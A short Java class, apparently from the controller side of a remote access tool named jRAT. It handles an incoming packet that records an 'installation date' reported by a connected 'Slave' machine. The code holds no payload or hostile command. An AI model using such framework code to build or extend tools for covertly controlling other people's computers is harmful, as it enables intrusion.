package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet31InitInstallationDate extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}
